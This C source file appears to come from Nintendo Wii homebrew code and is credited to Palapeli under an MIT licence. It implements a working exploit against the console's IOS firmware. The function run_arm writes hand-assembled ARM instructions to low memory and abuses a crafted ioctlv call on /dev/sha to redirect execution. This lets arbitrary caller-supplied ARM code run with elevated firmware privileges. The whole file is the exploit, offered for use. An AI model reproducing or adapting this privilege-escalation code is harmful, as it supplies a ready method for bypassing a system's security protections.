#include <gccore.h>
#include <ogcsys.h>
#include <ogc/ipc.h>
#include <arm.h>
#include <stdio.h>
#include <unistd.h>
/* exploit made by Palapeli, from https://github.com/mkwcat/saoirse/blob/master/channel/Main/IOSBoot.cpp (IOSBoot::Entry) */
/*
  MIT License

Copyright (c) 2022-2023 Palapeli

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
  */
void run_arm(u32* code, int len, bool thumb)
{
  u32* mem1 = (u32*)0x80000000;
  u32* entry = (u32*)((u32)code & ~0xc0000000);
  if (thumb) {
    entry = (u32*)((u32)entry | 1);
  }
  printf("Trying to execute ARM code at physical address %08x\n", (u32)entry);
  s32 fd = IOS_Open("/dev/sha", 0);
  if (fd < 0) return;
  printf("fd = IOS_Open(\"/dev/sha\");\n");
  mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
  mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
  mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
  mem1[3] = 0x47080000; // bx r1
  mem1[4] = 0x10100000; // temporary stack
  mem1[5] = (u32)entry;
  mem1[6] = 0xFFFF0014; // reserved handler

  DCFlushRange(mem1, 32);
  IOS_Write(-1, mem1, 32);
  ioctlv vec[4] ATTRIBUTE_ALIGN(32);
  vec[0].data = NULL;
  vec[0].len = 0;
  vec[1].data = (void*)0xFFFE0028;
  vec[1].len = 0;
  vec[2].data = (void*)0x80000000;
  vec[2].len = 32;

  IOS_Write(-1, code, len/4);
  int err = IOS_Ioctlv(fd, 0, 1, 2, vec);
  printf("IOS_Ioctlv(fd,0,1,2,vec) returned %d\n", err);
  int err_close = IOS_Close(fd);
  printf("IOS_Close(fd) returned %d\n", err_close);
}
